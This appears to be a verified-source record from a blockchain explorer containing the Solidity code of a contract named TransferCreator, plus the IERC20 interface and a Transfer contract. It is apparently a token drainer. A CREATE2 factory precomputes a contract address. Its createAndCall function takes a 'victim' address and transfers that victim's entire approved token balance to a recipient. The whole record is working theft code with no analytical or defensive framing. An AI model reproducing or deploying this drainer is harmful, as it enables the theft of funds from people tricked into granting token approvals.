{"SourceCode": "{\"IERC20.sol\":{\"content\":\"pragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC-20 standard as defined in the ERC.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(\\n        address indexed owner,\\n        address indexed spender,\\n        uint256 value\\n    );\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller\\u0027s account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(\\n        address owner,\\n        address spender\\n    ) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller\\u0027s tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender\\u0027s allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller\\u0027s\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 value\\n    ) external returns (bool);\\n}\\n\"},\"Transfer.sol\":{\"content\":\"pragma solidity ^0.8.0;\\n\\nimport \\\"./IERC20.sol\\\";\\n\\ncontract Transfer {\\n    address public owner;\\n    constructor(address _owner) payable {\\n        owner = _owner;\\n    }\\n\\n    function transferAll(\\n        address token,\\n        address sender,\\n        address recipient\\n    ) public returns (bool) {\\n        require(owner == msg.sender);\\n        IERC20 IToken = IERC20(token);\\n        uint256 balance = IToken.balanceOf(sender);\\n        (bool success, bytes memory data) = address(IToken).call(\\n            abi.encodeWithSelector(\\n                IToken.transferFrom.selector,\\n                sender,\\n                recipient,\\n                balance\\n            )\\n        );\\n        require(\\n            success \\u0026\\u0026 (data.length == 0 || abi.decode(data, (bool))),\\n            \\\"token transfer from sender failed\\\"\\n        );\\n        return true;\\n    }\\n\\n    function transferAmount(\\n        address token,\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) public returns (bool) {\\n        require(owner == msg.sender);\\n        IERC20 tokenContract = IERC20(token);\\n        tokenContract.transferFrom(sender, recipient, amount);\\n        return true;\\n    }\\n}\\n\"},\"TransferCreator.sol\":{\"content\":\"pragma solidity ^0.8.0;\\n\\nimport \\\"./Transfer.sol\\\";\\n\\ncontract TransferCreator {\\n    address private owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    function createContract(bytes32 salt) private returns (address) {\\n        Transfer _contract = new Transfer{salt: salt}(owner);\\n        return address(_contract);\\n    }\\n\\n    function getBytecode() private pure returns (bytes memory) {\\n        bytes memory bytecode = type(Transfer).creationCode;\\n        return abi.encodePacked(bytecode);\\n    }\\n\\n    function calculateAddress(bytes32 salt) public view returns (address) {\\n        bytes32 hash = keccak256(\\n            abi.encodePacked(\\n                bytes1(0xff),\\n                address(this),\\n                salt,\\n                keccak256(getBytecode())\\n            )\\n        );\\n        return address(uint160(uint256(hash)));\\n    }\\n\\n    function createAndCall(\\n        bytes32 salt,\\n        address victim,\\n        address token,\\n        address recipient\\n    ) public {\\n        require(owner == msg.sender);\\n        address contractAddress = createContract(salt);\\n\\n        bytes memory callData = abi.encodeWithSignature(\\n            \\\"transferAll(address token, address sender, address recipient)\\\",\\n            token,\\n            victim,\\n            recipient\\n        );\\n\\n        (bool success, bytes memory data) = contractAddress.call(callData);\\n        require(success, \\\"Fail\\\");\\n    }\\n}\\n\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"salt\",\"type\":\"bytes32\"}],\"name\":\"calculateAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"salt\",\"type\":\"bytes32\"},{\"internalType\":\"address\",\"name\":\"victim\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"}],\"name\":\"createAndCall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TransferCreator", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3f6a39a9905d5b6574ad59dc89ca8cfd689187229a6291669dd223203bd40a6b"}